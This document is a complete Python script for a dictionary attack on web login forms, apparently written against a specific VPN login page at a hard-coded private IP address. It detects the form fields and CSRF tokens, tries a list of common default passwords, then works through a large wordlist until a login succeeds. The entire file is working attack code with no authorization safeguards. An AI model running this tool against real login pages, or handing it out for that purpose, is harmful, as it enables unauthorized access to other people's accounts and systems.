#!/usr/bin/env python3
"""
form_login_bruteforce.py — Form-detecting HTTP POST dictionary attack tool.
Originally developed for RemoteLink VPN (Port 8072).

Features:
- Autodetects login form fields and hidden CSRF tokens.
- Verifies baseline rejection on bad passwords.
- Runs a fast-pass curated list first (~70 top passwords).
- Cascades into wordlists (e.g. rockyou.txt) with progress reporting.
- Detects success via redirects (302), session cookie issuance, or body markers.
"""

import argparse
from pathlib import Path
import re
import sys
import time
import requests

DEFAULT_BASE = "http://10.110.3.72:8072"
DEFAULT_LOGIN = "/login"

CURATED_PASSWORDS = [
    "admin", "admin123", "password", "password123", "123456", "12345678",
    "qwerty", "letmein", "welcome", "default", "changeme", "root", "toor",
    "vpn", "vpnuser", "vpnadmin", "secret", "guest", "pass", "login",
    "1234", "12345", "111111", "000000", "test", "master"
]


def detect_form_fields(base_url: str, login_path: str):
    """Scrapes login page to find username, password, and hidden inputs."""
    url = f"{base_url}{login_path}"
    try:
        r = requests.get(url, timeout=5)
    except Exception as e:
        sys.exit(f"[-] Could not connect to {url}: {e}")

    user_field = "username"
    pass_field = "password"
    hidden = {}

    for m in re.finditer(r'<input\s+([^>]+)>', r.text, flags=re.I):
        attrs = dict(re.findall(r'(\w+)=["\']([^"\']*)["\']', m.group(1)))
        itype = attrs.get("type", "text").lower()
        name = attrs.get("name")
        if not name:
            continue
        if itype == "password":
            pass_field = name
        elif itype in ("text", "email") and ("user" in name.lower() or "login" in name.lower() or "email" in name.lower()):
            user_field = name
        elif itype == "hidden":
            hidden[name] = attrs.get("value", "")

    return user_field, pass_field, hidden


def try_login(session: requests.Session, url: str, u_field: str, p_field: str, username: str, password: str, hidden: dict):
    data = {u_field: username, p_field: password}
    data.update(hidden)
    try:
        r = session.post(url, data=data, timeout=5, allow_redirects=False)
        return r.status_code, r.text, r.headers.get("Location", ""), dict(session.cookies)
    except Exception:
        return None, "", "", {}


def is_success(status: int, text: str, location: str, cookies: dict) -> bool:
    if status == 302 and location and "login" not in location.lower():
        return True
    if any(m in text.lower() for m in ["dashboard", "sign out", "logout", "welcome,"]):
        return True
    return False


def main():
    parser = argparse.ArgumentParser(
        description="HTTP POST form dictionary brute-forcer."
    )
    parser.add_argument("--base", default=DEFAULT_BASE, help="Target base URL")
    parser.add_argument("--path", default=DEFAULT_LOGIN, help="Login path (default: /login)")
    parser.add_argument("--user", default="vpnuser", help="Username to target (default: vpnuser)")
    parser.add_argument("--wordlist", help="Path to dictionary wordlist (e.g. rockyou.txt)")
    parser.add_argument("--skip-curated", action="store_true", help="Skip top passwords fast-pass")
    args = parser.parse_args()

    url = f"{args.base}{args.path}"
    print(f"[*] Target URL : {url}")
    print(f"[*] Target User: {args.user}")

    u_field, p_field, hidden = detect_form_fields(args.base, args.path)
    print(f"[*] Detected fields: user='{u_field}', pass='{p_field}', hidden={hidden}")

    # Baseline check
    s = requests.Session()
    status, body, loc, ck = try_login(s, url, u_field, p_field, args.user, "wrong_pw_xyz_random", hidden)
    if is_success(status, body, loc, ck):
        sys.exit("[-] Baseline check failed: wrong password reported success. Review detection logic.")
    print("[+] Baseline rejection verified.")

    # Phase 1: Curated list
    if not args.skip_curated:
        print(f"\n[*] PHASE 1: Testing curated list ({len(CURATED_PASSWORDS)} passwords)...")
        for pw in CURATED_PASSWORDS:
            s = requests.Session()
            status, body, loc, ck = try_login(s, url, u_field, p_field, args.user, pw, hidden)
            if is_success(status, body, loc, ck):
                print(f"\n[+] SUCCESS! Password found in curated list:")
                print(f"    Username : {args.user}")
                print(f"    Password : {pw}")
                print(f"    Location : {loc}")
                return

    # Phase 2: Wordlist
    if args.wordlist:
        wp = Path(args.wordlist)
        if not wp.exists():
            sys.exit(f"[-] Wordlist not found at {wp}")

        print(f"\n[*] PHASE 2: Streaming wordlist ({wp})...")
        t0 = time.time()
        count = 0
        with open(wp, encoding="latin-1", errors="replace") as f:
            for line in f:
                pw = line.strip()
                if not pw:
                    continue
                count += 1
                s = requests.Session()
                status, body, loc, ck = try_login(s, url, u_field, p_field, args.user, pw, hidden)
                if is_success(status, body, loc, ck):
                    dt = time.time() - t0
                    print(f"\n[+] SUCCESS! Password found after {count} tries ({dt:.1f}s):")
                    print(f"    Username : {args.user}")
                    print(f"    Password : {pw}")
                    print(f"    Location : {loc}")
                    return
                if count % 200 == 0:
                    rate = count / max(time.time() - t0, 0.01)
                    print(f"    ... {count} candidates tried ({rate:.0f} tries/s)")

    print("\n[-] Brute-force completed. No valid password found.")


if __name__ == "__main__":
    main()
